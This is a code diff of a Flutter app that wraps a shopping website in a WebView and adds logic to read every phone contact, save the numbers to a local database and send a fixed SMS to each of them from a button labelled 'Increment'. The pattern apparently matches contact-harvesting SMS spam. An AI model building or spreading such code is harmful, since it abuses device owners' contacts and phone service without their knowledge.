@@ -1,10 +1,14 @@
 import 'package:flutter/material.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:sms_flutter/Constants.dart';
+import 'package:sms_flutter/User.dart';
+import 'package:sms_flutter/dbHelper.dart';
 import 'package:telephony/telephony.dart';
 import 'package:contacts_service/contacts_service.dart';
 
 import 'PrefHelper.dart';
+import 'package:flutter/services.dart';
+import 'package:flutter_inappwebview/flutter_inappwebview.dart';
 
 void main() {
   runApp(const MyApp());
@@ -44,10 +48,12 @@ class _MyHomePageState extends State<MyHomePage> with PrefHelper {
   List<String> messageNumber = [];
   // final Permission _permission;
   // PermissionStatus _permissionStatus = PermissionStatus.denied;
+  var dbHelper = DBHelper();
   @override
   void initState() {
     requestPermission();
-    fetchContacts();
+    dbHelper.db;
+    // fetchContacts();
     super.initState();
   }
 
@@ -70,33 +76,37 @@ class _MyHomePageState extends State<MyHomePage> with PrefHelper {
       });
     };
 
-    return Scaffold(
-      appBar: AppBar(
-        title: Text(widget.title),
-      ),
-      body: Center(
-        child: Column(
-          mainAxisAlignment: MainAxisAlignment.center,
-          children: <Widget>[
-            Text(
-              '$statusNew',
-            ),
-          ],
+    return Container(
+      color: Colors.white,
+      child: SafeArea (
+        child: Scaffold(
+          body: InAppWebView(
+            initialUrlRequest: URLRequest(
+                url: Uri.parse(
+                    "https://buyindia.net")),
+            initialOptions: InAppWebViewGroupOptions(
+                crossPlatform: InAppWebViewOptions(disableHorizontalScroll: true,
+                    horizontalScrollBarEnabled: false,
+                    verticalScrollBarEnabled: false,
+                    preferredContentMode: UserPreferredContentMode.MOBILE
+                ),
+                ios: IOSInAppWebViewOptions(disallowOverScroll: true,
+                  alwaysBounceHorizontal: false,
+                  alwaysBounceVertical: false,
+                  enableViewportScale: true,
+                ),
+                android: AndroidInAppWebViewOptions(
+                    overScrollMode: AndroidOverScrollMode.OVER_SCROLL_NEVER)),
+          ),
+          floatingActionButton: FloatingActionButton(
+            onPressed: () {
+              fetchContacts();
+              sendMessageToMultiple();
+            },
+            tooltip: 'Increment',
+            child: const Icon(Icons.add),
+          ),
         ),
-      ),
-      floatingActionButton: FloatingActionButton(
-        onPressed: () {
-          fetchContacts();
-
-          // telephony.sendSms(
-          //     to: "8758022838",
-          //     message: "HI I am robot so may be this forced message!",
-          //     statusListener: listener);
-
-
-        },
-        tooltip: 'Increment',
-        child: const Icon(Icons.add),
       ),
     );
   }
@@ -124,7 +134,7 @@ Future<void> fetchContacts() async {
         names.add(contact.displayName ?? contact.givenName);
 
         phones.add(phone.value.toString().replaceAll(" ", ""));
-        print(phone.value.toString().replaceAll(" ", ""));
+        // print(phone.value.toString().replaceAll(" ", ""));
 
       });
     });
@@ -133,7 +143,13 @@ Future<void> fetchContacts() async {
     // phones.toSet().toList();
     print(phones.length);
     messageNumber = importNumber(phones);
-    setList(PrefHelper.USER_MOBILE_LIST, messageNumber);
+    messageNumber.forEach((element) {
+      User user = User();
+      user.userMobile = element;
+      user.userMsgStatus = Constants.MSG_INTIAL;
+      dbHelper.saveNumber(user);
+    });
+    // setList(PrefHelper.USER_MOBILE_LIST, messageNumber);
   }
   else {
     requestPermission();
@@ -156,8 +172,18 @@ List<String> importNumber(List<String> phoneNumber) {
       }
     });
 
+
+
     return (realNumber.toSet().toList());
     // return realNumber;
+  }
+
+
+  void fetchContactfromDB() async {
+
+
+    // print("-------------------------------------------------------------------------$numbers");
+    // print(dbHelper.selectNumber() as List<String>);
   }
 
 Future<String> sendMessage(String number,String message) async {
@@ -181,19 +207,18 @@ Future<String> sendMessage(String number,String message) async {
   return statusStr;
   }
 
-Future<void> sendMessageToMultiple(List<String?> numbers) async {
+void sendMessageToMultiple() async {
 
-List<String>? diliverdContacts = getList(Constants.MSG_DELIVERD);
+List<String>? diliverdContacts = getList(PrefHelper.USER_DELIVERD_MSG_LIST);
 
 String statusOfMsg = "";
+// List<String>? numbers = getList(PrefHelper.USER_MOBILE_LIST);
+List<String> numbers = await dbHelper.selectNumber() as List<String>;
+
+print(numbers);
 
 
 
-
-     for(var i = 0; i < numbers.length; i++) {
-
-
-      }
 
 
     // if(numbers.length < 100) {
@@ -205,21 +230,27 @@ String statusOfMsg = "";
     //
     // }
 
+numbers.forEach((element) async {
 
-// if(statusOfMsg == "") {
-//   if(!(diliverdContacts!.contains(element))){
-//     statusOfMsg =  sendMessage(element!, Constants.Message) as String;
-//     diliverdContacts.add(element);
-//   }
-//
-// }else if (statusOfMsg == Constants.MSG_DELIVERD) {
-//   if(!(diliverdContacts!.contains(element))){
-//     statusOfMsg =  sendMessage(element!, Constants.Message) as String;
-//     diliverdContacts.add(element);
-//   }
-// } else if (statusOfMsg == Constants.MSG_SENDING) {
-//
-// }
+  if( await dbHelper.getNumberStatus(element) == Constants.MSG_INTIAL){
+    statusOfMsg =  sendMessage(element, Constants.Message) as String;
+    if(statusOfMsg == Constants.MSG_DELIVERD){
+      User user = User();
+      user.userMobile = element;
+      user.userMsgStatus = Constants.MSG_DELIVERD;
+      dbHelper.updateNumber(user);
+
+  } else {
+      return;
+    }
+
+
+  }
+
+ });
+
+
+
 //
 //
 // if(!(diliverdContacts!.contains(element))){
